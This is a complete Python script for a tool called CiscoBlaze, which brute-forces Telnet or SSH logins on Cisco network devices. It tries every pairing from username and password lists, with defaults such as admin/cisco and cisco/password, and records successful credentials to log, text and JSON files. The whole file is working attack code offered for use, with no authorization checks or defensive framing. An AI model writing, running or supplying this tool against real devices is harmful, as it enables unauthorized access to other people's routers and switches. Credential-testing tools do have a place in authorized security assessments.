import argparse
import logging
import sys
import time
import json
import telnetlib
import paramiko
from typing import List, Optional

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(message)s',
    handlers=[
        logging.FileHandler('ciscoblaze.log'),
        logging.StreamHandler(sys.stdout)
    ]
)

class CiscoBlaze:
    def __init__(self, target: str, port: int, user_file: Optional[str], pass_file: Optional[str], protocol: str, quiet: bool = False):
        self.target = target
        self.port = port
        self.user_file = user_file
        self.pass_file = pass_file
        self.protocol = protocol.lower()
        self.quiet = quiet
        self.users = self.load_file(user_file) if user_file else ['admin', 'cisco']
        self.passwords = self.load_file(pass_file) if pass_file else ['cisco', 'password']
        self.results = []
        self.output_file = f"ciscoblaze_results_{time.strftime('%Y%m%d_%H%M%S')}.txt"
        self.json_file = f"ciscoblaze_results_{time.strftime('%Y%m%d_%H%M%S')}.json"

    def load_file(self, file_path: str) -> List[str]:
        """Load usernames or passwords from file."""
        try:
            with open(file_path, 'r') as f:
                return [line.strip() for line in f if line.strip()]
        except Exception as e:
            logging.error(f"Error reading file {file_path}: {e}")
            return []

    def test_telnet(self, user: str, password: str) -> Optional[str]:
        """Test Telnet login."""
        try:
            tn = telnetlib.Telnet(self.target, self.port, timeout=5)
            tn.read_until(b"Username:", timeout=5)
            tn.write(user.encode() + b"\r\n")
            tn.read_until(b"Password:", timeout=5)
            tn.write(password.encode() + b"\r\n")
            response = tn.read_some().decode(errors='ignore')
            tn.close()
            if ">" in response or "#" in response:
                return f"Telnet login successful: {user}:{password}"
            return None
        except Exception as e:
            logging.debug(f"Telnet login error for {user}:{password}: {e}")
            return None

    def test_ssh(self, user: str, password: str) -> Optional[str]:
        """Test SSH login."""
        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(self.target, port=self.port, username=user, password=password, timeout=5)
            client.close()
            return f"SSH login successful: {user}:{password}"
        except Exception as e:
            logging.debug(f"SSH login error for {user}:{password}: {e}")
            return None

    def run(self):
        """Run brute-force test."""
        if self.protocol not in ['telnet', 'ssh']:
            logging.error(f"Protocol {self.protocol} not supported. Choose 'telnet' or 'ssh'.")
            return

        logging.info(f"Starting CiscoBlaze on {self.target}:{self.port}, protocol: {self.protocol}")
        login_results = []
        for user in self.users:
            for password in self.passwords:
                result = self.test_telnet(user, password) if self.protocol == 'telnet' else self.test_ssh(user, password)
                if result:
                    self.results.append(result)
                    login_results.append({"user": user, "password": password, "status": "success"})
                    logging.info(result)
                else:
                    login_results.append({"user": user, "password": password, "status": "failed"})
                    logging.info(f"Login failed: {user}:{password}")

        # Save text results
        with open(self.output_file, 'a') as f:
            for result in self.results:
                f.write(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] {result}\n")
            f.write(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] Test complete\n")

        # Save JSON results
        with open(self.json_file, 'w') as f:
            json.dump({"target": self.target, "port": self.port, "protocol": self.protocol,
                       "results": login_results, "timestamp": time.strftime('%Y-%m-%d %H:%M:%S')}, f, indent=4)

        logging.info(f"Test complete. Results saved to {self.output_file} and {self.json_file}")

def main():
    parser = argparse.ArgumentParser(description="CiscoBlaze - Brute-force Cisco device logins.")
    parser.add_argument('-t', '--target', required=True, help='Target IP (e.g., 192.168.1.1)')
    parser.add_argument('-p', '--port', type=int, required=True, help='Target port (e.g., 23)')
    parser.add_argument('-u', '--user-file', help='File with usernames (one per line)')
    parser.add_argument('-w', '--pass-file', help='File with passwords (one per line)')
    parser.add_argument('-m', '--protocol', required=True, choices=['telnet', 'ssh'], help='Protocol to test')
    parser.add_argument('-q', '--quiet', action='store_true', help='Quiet mode (log to file only)')

    args = parser.parse_args()

    if args.quiet:
        logging.getLogger().handlers = [logging.FileHandler('ciscoblaze.log')]

    blaze = CiscoBlaze(
        target=args.target,
        port=args.port,
        user_file=args.user_file,
        pass_file=args.pass_file,
        protocol=args.protocol,
        quiet=args.quiet
    )
    try:
        blaze.run()
    except KeyboardInterrupt:
        logging.info("Test interrupted by user")
        sys.exit(0)

if __name__ == "__main__":
    main()